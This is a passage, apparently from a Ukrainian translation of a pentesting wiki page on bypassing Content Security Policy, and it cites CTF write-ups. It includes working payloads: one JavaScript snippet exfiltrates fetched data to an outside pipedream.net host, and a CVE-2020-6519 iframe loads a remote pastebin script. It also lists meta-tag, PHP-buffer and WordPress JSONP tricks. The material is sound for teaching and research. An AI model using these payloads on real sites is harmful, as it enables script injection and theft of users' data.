–¶—è –∞—Ç–∞–∫–∞ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –ø–µ–≤–Ω—É —Å–æ—Ü—ñ–∞–ª—å–Ω—É —ñ–Ω–∂–µ–Ω–µ—Ä—ñ—é, –¥–µ –∞—Ç–∞–∫—É—é—á–∏–π **–ø–µ—Ä–µ–∫–æ–Ω—É—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø–µ—Ä–µ—Ç—è–≥–Ω—É—Ç–∏ —Ç–∞ —Å–∫–∏–Ω—É—Ç–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –∑–∞–∫–ª–∞–¥–∫—É –±—Ä–∞—É–∑–µ—Ä–∞**. –¶—è –∑–∞–∫–ª–∞–¥–∫–∞ –º—ñ—Å—Ç–∏—Ç–∏–º–µ **—à–∫—ñ–¥–ª–∏–≤–∏–π javascript** –∫–æ–¥, —è–∫–∏–π, –∫–æ–ª–∏ –π–æ–≥–æ –ø–µ—Ä–µ—Ç—è–≥–Ω—É—Ç—å –∞–±–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç—å, –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ –ø–æ—Ç–æ—á–Ω–æ–≥–æ –≤–µ–±-–≤—ñ–∫–Ω–∞, **–æ–±—Ö–æ–¥—è—á–∏ CSP —ñ –¥–æ–∑–≤–æ–ª—è—é—á–∏ –≤–∫—Ä–∞—Å—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é** —Ç–∞–∫—É —è–∫ –∫—É–∫–∏ –∞–±–æ —Ç–æ–∫–µ–Ω–∏.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó [**–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –∑–≤—ñ—Ç —Ç—É—Ç**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP bypass by restricting CSP

–£ [**—Ü—å–æ–º—É CTF –∑–≤—ñ—Ç—ñ**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution) CSP –æ–±—Ö–æ–¥–∏—Ç—å—Å—è —à–ª—è—Ö–æ–º —ñ–Ω–∂–µ–∫—Ü—ñ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—É –¥–æ–∑–≤–æ–ª–µ–Ω–æ–≥–æ iframe –±—ñ–ª—å—à –æ–±–º–µ–∂—É–≤–∞–ª—å–Ω–æ–≥–æ CSP, —è–∫–∏–π –∑–∞–±–æ—Ä–æ–Ω—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ JS —Ñ–∞–π–ª—É, —è–∫–∏–π, –ø–æ—Ç—ñ–º, —á–µ—Ä–µ–∑ **–ø—Ä–æ—Ç–æ—Ç–∏–ø–Ω–µ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è** –∞–±–æ **dom clobbering** –¥–æ–∑–≤–æ–ª—è—î **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —ñ–Ω—à–∏–º —Å–∫—Ä–∏–ø—Ç–æ–º –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç—É**.

–í–∏ –º–æ–∂–µ—Ç–µ **–æ–±–º–µ–∂–∏—Ç–∏ CSP iframe** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∞—Ç—Ä–∏–±—É—Ç–∞ **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

–£ [**—Ü—å–æ–º—É CTF –∑–≤—ñ—Ç—ñ**](https://github.com/aszx87410/ctf-writeups/issues/48) –±—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º —á–µ—Ä–µ–∑ **–≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è HTML** **–æ–±–º–µ–∂–∏—Ç–∏** –±—ñ–ª—å—à–µ **CSP**, —Ç–æ–º—É —Å–∫—Ä–∏–ø—Ç, —â–æ –∑–∞–ø–æ–±—ñ–≥–∞—î CSTI, –±—É–≤ –≤–∏–º–∫–Ω–µ–Ω–∏–π, —ñ, –æ—Ç–∂–µ, **–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Å—Ç–∞–ª–∞ –µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω–æ—é.**\
CSP –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –±—ñ–ª—å—à –æ–±–º–µ–∂—É–≤–∞–ª—å–Ω–∏–º, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **HTML –º–µ—Ç–∞-—Ç–µ–≥–∏**, –∞ –≤–±—É–¥–æ–≤–∞–Ω—ñ —Å–∫—Ä–∏–ø—Ç–∏ –º–æ–∂–Ω–∞ –≤–∏–º–∫–Ω—É—Ç–∏ **–≤–∏–¥–∞–ª–µ–Ω–Ω—è–º** **–≤—Ö–æ–¥—É**, —â–æ –¥–æ–∑–≤–æ–ª—è—î —ó—Ö **nonce** —Ç–∞ **–≤–∫–ª—é—á–∏—Ç–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –≤–±—É–¥–æ–≤–∞–Ω–∏–π —Å–∫—Ä–∏–ø—Ç —á–µ—Ä–µ–∑ sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### JS exfiltration with Content-Security-Policy-Report-Only

–Ø–∫—â–æ –≤–∞–º –≤–¥–∞—Å—Ç—å—Å—è –∑–º—É—Å–∏—Ç–∏ —Å–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø–æ–≤—ñ—Å—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–∫–æ–º **`Content-Security-Policy-Report-Only`** –∑ **–∑–Ω–∞—á–µ–Ω–Ω—è–º, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–º –≤–∞–º–∏** (–º–æ–∂–ª–∏–≤–æ, —á–µ—Ä–µ–∑ CRLF), –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –Ω–∞ —Å–≤—ñ–π —Å–µ—Ä–≤–µ—Ä, —ñ —è–∫—â–æ –≤–∏ **–æ–±–µ—Ä–Ω–µ—Ç–µ** **JS –∫–æ–Ω—Ç–µ–Ω—Ç**, —è–∫–∏–π —Ö–æ—á–µ—Ç–µ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏, –≤ **`<script>`**, —ñ –æ—Å–∫—ñ–ª—å–∫–∏, –π–º–æ–≤—ñ—Ä–Ω–æ, `unsafe-inline` –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω–æ CSP, —Ü–µ **–≤–∏–∫–ª–∏—á–µ –ø–æ–º–∏–ª–∫—É CSP**, —ñ —á–∞—Å—Ç–∏–Ω–∞ —Å–∫—Ä–∏–ø—Ç—É (—â–æ –º—ñ—Å—Ç–∏—Ç—å —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é) –±—É–¥–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑ `Content-Security-Policy-Report-Only`.

–î–ª—è –ø—Ä–∏–∫–ª–∞–¥—É [**–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ–π CTF –∑–≤—ñ—Ç**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### –í–∏—Ç—ñ–∫ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑ CSP —Ç–∞ Iframe

* –°—Ç–≤–æ—Ä—é—î—Ç—å—Å—è `iframe`, —è–∫–∏–π –≤–∫–∞–∑—É—î –Ω–∞ URL (–Ω–∞–∑–≤–µ–º–æ –π–æ–≥–æ `https://example.redirect.com`), —â–æ –¥–æ–∑–≤–æ–ª–µ–Ω–∏–π CSP.
* –¶–µ–π URL –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –Ω–∞ —Å–µ–∫—Ä–µ—Ç–Ω–∏–π URL (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `https://usersecret.example2.com`), —è–∫–∏–π **–Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω–∏–π** CSP.
* –°–ª—É—Ö–∞—é—á–∏ –ø–æ–¥—ñ—é `securitypolicyviolation`, –º–æ–∂–Ω–∞ –∑–∞—Ö–æ–ø–∏—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `blockedURI`. –¶—è –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å —Ä–æ–∑–∫—Ä–∏–≤–∞—î –¥–æ–º–µ–Ω –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ–≥–æ URI, –≤–∏—Ç—ñ–∫–∞—é—á–∏ —Å–µ–∫—Ä–µ—Ç–Ω–∏–π –¥–æ–º–µ–Ω, –Ω–∞ —è–∫–∏–π –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏–≤ –ø–æ—á–∞—Ç–∫–æ–≤–∏–π URL.

–¶—ñ–∫–∞–≤–æ –≤—ñ–¥–∑–Ω–∞—á–∏—Ç–∏, —â–æ –±—Ä–∞—É–∑–µ—Ä–∏, —Ç–∞–∫—ñ —è–∫ Chrome —Ç–∞ Firefox, –º–∞—é—Ç—å —Ä—ñ–∑–Ω—É –ø–æ–≤–µ–¥—ñ–Ω–∫—É –≤ –æ–±—Ä–æ–±—Ü—ñ iframe —Å—Ç–æ—Å–æ–≤–Ω–æ CSP, —â–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–≥–æ –≤–∏—Ç–æ–∫—É —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ –Ω–µ–≤–∏–∑–Ω–∞—á–µ–Ω—É –ø–æ–≤–µ–¥—ñ–Ω–∫—É.

–Ü–Ω—à–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –ø–æ–ª—è–≥–∞—î –≤ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Å–∞–º–æ–≥–æ CSP –¥–ª—è –≤–∏–≤–µ–¥–µ–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –ø—ñ–¥–¥–æ–º–µ–Ω—É. –¶–µ–π –º–µ—Ç–æ–¥ —Å–ø–∏—Ä–∞—î—Ç—å—Å—è –Ω–∞ –∞–ª–≥–æ—Ä–∏—Ç–º –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ –ø–æ—à—É–∫—É —Ç–∞ –∫–æ—Ä–∏–≥—É–≤–∞–Ω–Ω—è CSP, —â–æ–± –≤–∫–ª—é—á–∏—Ç–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –¥–æ–º–µ–Ω–∏, —è–∫—ñ –Ω–∞–≤–º–∏—Å–Ω–æ –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω—ñ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ —Å–µ–∫—Ä–µ—Ç–Ω–∏–π –ø—ñ–¥–¥–æ–º–µ–Ω —Å–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑ –Ω–µ–≤—ñ–¥–æ–º–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤, –≤–∏ –º–æ–∂–µ—Ç–µ —ñ—Ç–µ—Ä–∞—Ç–∏–≤–Ω–æ —Ç–µ—Å—Ç—É–≤–∞—Ç–∏ —Ä—ñ–∑–Ω—ñ –ø—ñ–¥–¥–æ–º–µ–Ω–∏, –∑–º—ñ–Ω—é—é—á–∏ –¥–∏—Ä–µ–∫—Ç–∏–≤—É CSP, —â–æ–± –±–ª–æ–∫—É–≤–∞—Ç–∏ –∞–±–æ –¥–æ–∑–≤–æ–ª—è—Ç–∏ —Ü—ñ –ø—ñ–¥–¥–æ–º–µ–Ω–∏. –û—Å—å —Ñ—Ä–∞–≥–º–µ–Ω—Ç, —â–æ –ø–æ–∫–∞–∑—É—î, —è–∫ CSP –º–æ–∂–µ –±—É—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –¥–ª—è –ø–æ–ª–µ–≥—à–µ–Ω–Ω—è —Ü—å–æ–≥–æ –º–µ—Ç–æ–¥—É:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
–ú–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ –∑–∞–ø–∏—Ç—ñ–≤, —è–∫—ñ –±–ª–æ–∫—É—é—Ç—å—Å—è –∞–±–æ –¥–æ–∑–≤–æ–ª—è—é—Ç—å—Å—è CSP, –¥–æ–∑–≤–æ–ª—è—î –∑–≤—É–∑–∏—Ç–∏ –º–æ–∂–ª–∏–≤—ñ —Å–∏–º–≤–æ–ª–∏ –≤ —Å–µ–∫—Ä–µ—Ç–Ω–æ–º—É –ø—ñ–¥–¥–æ–º–µ–Ω—ñ, –≤—Ä–µ—à—Ç—ñ-—Ä–µ—à—Ç –≤–∏—è–≤–∏–≤—à–∏ –ø–æ–≤–Ω–∏–π URL.

–û–±–∏–¥–≤–∞ –º–µ—Ç–æ–¥–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É—é—Ç—å –Ω—é–∞–Ω—Å–∏ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó —Ç–∞ –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ CSP —É –±—Ä–∞—É–∑–µ—Ä–∞—Ö, –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—á–∏, —è–∫, –∑–¥–∞–≤–∞–ª–æ—Å—è –±, –±–µ–∑–ø–µ—á–Ω—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ –º–æ–∂—É—Ç—å –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –≤–∏—Ç—ñ–∫–∞—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.

–¢—Ä—é–∫ –∑ [**—Ç—É—Ç**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) —Å–µ—Ä–≤–µ—Ä–∞, —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ —à—É–∫–∞—á–∞–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π!

**–Ü–Ω—Å–∞–π—Ç–∏ –∑ —Ö–∞–∫—ñ–Ω–≥—É**\
–ó–∞–ª—É—á–∞–π—Ç–µ—Å—è –¥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É, —è–∫–∏–π –∑–∞–Ω—É—Ä—é—î—Ç—å—Å—è –≤ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ —Ö–∞–∫—ñ–Ω–≥ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**\
–°–ª—ñ–¥–∫—É–π—Ç–µ –∑–∞ —à–≤–∏–¥–∫–æ–ø–ª–∏–Ω–Ω–∏–º —Å–≤—ñ—Ç–æ–º —Ö–∞–∫—ñ–Ω–≥—É —á–µ—Ä–µ–∑ –Ω–æ–≤–∏–Ω–∏ —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–æ–≤–∏—Ö –ø—Ä–æ–≥—Ä–∞–º –≤–∏–Ω–∞–≥–æ—Ä–æ–¥ –∑–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º

**–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞** [**Discord**](https://discord.com/invite/N3FrSbmwdy) —ñ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –ø—Ä–æ–≤—ñ–¥–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

## –ù–µ–±–µ–∑–ø–µ—á–Ω—ñ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—ó –¥–ª—è –æ–±—Ö–æ–¥—É CSP

### PHP –ø–æ–º–∏–ª–∫–∏ –ø—Ä–∏ –Ω–∞–¥–º—ñ—Ä–Ω—ñ–π –∫—ñ–ª—å–∫–æ—Å—Ç—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤

–ó–≥—ñ–¥–Ω–æ –∑ [**–æ—Å—Ç–∞–Ω–Ω—ñ–º –º–µ—Ç–æ–¥–æ–º, –ø—Ä–æ–∫–æ–º–µ–Ω—Ç–æ–≤–∞–Ω–∏–º —É —Ü—å–æ–º—É –≤—ñ–¥–µ–æ**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –∑–∞–Ω–∞–¥—Ç–æ –±–∞–≥–∞—Ç—å–æ—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ (1001 GET –ø–∞—Ä–∞–º–µ—Ç—Ä, —Ö–æ—á–∞ —Ü–µ —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑ POST –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ —Ç–∞ –±—ñ–ª—å—à–µ –Ω—ñ–∂ 20 —Ñ–∞–π–ª–∞–º–∏). –ë—É–¥—å-—è–∫–∏–π –≤–∏–∑–Ω–∞—á–µ–Ω–∏–π **`header()`** —É PHP –≤–µ–±-–∫–æ–¥—ñ **–Ω–µ –±—É–¥–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ** —á–µ—Ä–µ–∑ –ø–æ–º–∏–ª–∫—É, —è–∫—É —Ü–µ –≤–∏–∫–ª–∏—á–µ.

### –ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ PHP

PHP –≤—ñ–¥–æ–º–∏–π —Ç–∏–º, —â–æ **–±—É—Ñ–µ—Ä–∏–∑—É—î –≤—ñ–¥–ø–æ–≤—ñ–¥—å –¥–æ 4096** –±–∞–π—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º. –¢–æ–º—É, —è–∫—â–æ PHP –ø–æ–∫–∞–∑—É—î –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è, –Ω–∞–¥–∞—é—á–∏ **–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –¥–∞–Ω–∏—Ö —É –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è—Ö**, **–≤—ñ–¥–ø–æ–≤—ñ–¥—å** –±—É–¥–µ **–Ω–∞–¥—ñ—Å–ª–∞–Ω–∞** **–ø–µ—Ä–µ–¥** **CSP –∑–∞–≥–æ–ª–æ–≤–∫–æ–º**, —â–æ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ —ñ–≥–Ω–æ—Ä—É–≤–∞–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞.\
–û—Ç–∂–µ, —Ç–µ—Ö–Ω—ñ–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –ø–æ–ª—è–≥–∞—î –≤ **–∑–∞–ø–æ–≤–Ω–µ–Ω–Ω—ñ –±—É—Ñ–µ—Ä–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è–º–∏**, —â–æ–± CSP –∑–∞–≥–æ–ª–æ–≤–æ–∫ –Ω–µ –±—É–≤ –Ω–∞–¥—ñ—Å–ª–∞–Ω–∏–π.

–Ü–¥–µ—è –∑ [**—Ü—å–æ–≥–æ –æ–ø–∏—Å—É**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### –ü–µ—Ä–µ–ø–∏—Å–∞—Ç–∏ —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø–æ–º–∏–ª–∫–∏

–ó [**—Ü—å–æ–≥–æ –æ–ø–∏—Å—É**](https://blog.ssrf.kr/69) –≤–∏–≥–ª—è–¥–∞—î —Ç–∞–∫, —â–æ –±—É–ª–æ –º–æ–∂–ª–∏–≤–æ –æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç CSP, –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–≤—à–∏ —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø–æ–º–∏–ª–∫–∏ (–º–æ–∂–ª–∏–≤–æ, –±–µ–∑ CSP) —ñ –ø–µ—Ä–µ–ø–∏—Å–∞–≤—à–∏ —ó—ó –≤–º—ñ—Å—Ç.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME - —Ü–µ —Ç–µ—Ö–Ω—ñ–∫–∞, —è–∫–∞ –∑–ª–æ–≤–∂–∏–≤–∞—î XSS (–∞–±–æ —Å–∏–ª—å–Ω–æ –æ–±–º–µ–∂–µ–Ω–∏–º XSS) **–≤ –∫—ñ–Ω—Ü–µ–≤—ñ–π —Ç–æ—á—Ü—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏** –¥–ª—è **–∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è** **—ñ–Ω—à–∏–º–∏ –∫—ñ–Ω—Ü–µ–≤–∏–º–∏ —Ç–æ—á–∫–∞–º–∏ –æ–¥–Ω–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è.** –¶–µ —Ä–æ–±–∏—Ç—å—Å—è —à–ª—è—Ö–æ–º –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—ó –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –∑ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, –∞ –ø–æ—Ç—ñ–º –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ –Ω–∞ —Ä–µ–∞–ª—å–Ω—É –∫—ñ–Ω—Ü–µ–≤—É —Ç–æ—á–∫—É –≤ —Ç–æ–º—É –∂ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—ñ, —è–∫—É –≤–∏ —Ö–æ—á–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, **–≤—Ä–∞–∑–ª–∏–≤–∞ –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞** –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–±'—î–∫—Ç **`opener`** —É **payload** –¥–ª—è **–¥–æ—Å—Ç—É–ø—É –¥–æ DOM** **—Ä–µ–∞–ª—å–Ω–æ—ó –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è**. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, **wordpress** –º–∞—î **JSONP** –∫—ñ–Ω—Ü–µ–≤—É —Ç–æ—á–∫—É –≤ `/wp-json/wp/v2/users/1?_jsonp=data`, —è–∫–∞ **–≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏–º–µ** **–¥–∞–Ω—ñ**, –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ –≤ –≤–∏—Ö—ñ–¥–Ω–∏—Ö –¥–∞–Ω–∏—Ö (–∑ –æ–±–º–µ–∂–µ–Ω–Ω—è–º –ª–∏—à–µ –Ω–∞ –ª—ñ—Ç–µ—Ä–∏, —Ü–∏—Ñ—Ä–∏ —Ç–∞ –∫—Ä–∞–ø–∫–∏).

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –∫—ñ–Ω—Ü–µ–≤–æ—é —Ç–æ—á–∫–æ—é, —â–æ–± **–∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –∞—Ç–∞–∫—É SOME** –ø—Ä–æ—Ç–∏ WordPress —ñ **–≤–±—É–¥—É–≤–∞—Ç–∏** —ó—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—É `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`, –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ–π **—Å–∫—Ä–∏–ø—Ç** –±—É–¥–µ **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω **–¥–æ–∑–≤–æ–ª–µ–Ω–∏–π 'self'**. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —ñ –æ—Å–∫—ñ–ª—å–∫–∏ WordPress –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ **–∞—Ç–∞–∫–æ—é SOME** —á–µ—Ä–µ–∑ **–≤—Ä–∞–∑–ª–∏–≤—É** **–∫—ñ–Ω—Ü–µ–≤—É —Ç–æ—á–∫—É –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É**, —è–∫–∞ **–æ–±—Ö–æ–¥–∏—Ç—å CSP**, —â–æ–± –Ω–∞–¥–∞—Ç–∏ –±—ñ–ª—å—à–µ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É, –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –Ω–æ–≤–∏–π 